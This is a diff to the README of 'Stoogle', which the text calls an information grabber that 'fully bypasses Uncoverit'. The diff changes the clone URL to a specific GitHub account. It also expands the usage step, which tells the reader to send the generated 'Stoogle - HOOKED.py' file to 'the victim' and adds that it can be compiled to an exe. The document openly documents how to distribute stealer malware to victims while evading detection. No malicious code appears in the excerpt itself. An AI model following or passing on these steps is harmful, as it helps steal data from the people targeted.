@@ -13,7 +13,7 @@ Stoogle is a high-level information grabber that **fully bypasses Uncoverit**. I
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/yourusername/Stoogle.git
+    git clone https://github.com/ILikeCodingg5565/Stoogle.git
     cd Stoogle
     ```
 
@@ -28,7 +28,8 @@ Stoogle is a high-level information grabber that **fully bypasses Uncoverit**. I
     ```
 4. Send:
    Send the newly generated 'Stoogle - HOOKED.py' to the victim.
-   You can compile it
+   You can compile it to an exe.
+   
 ## 🔧 Configuration
 
 Modify the configuration file (`config.py`) to customize the script. 
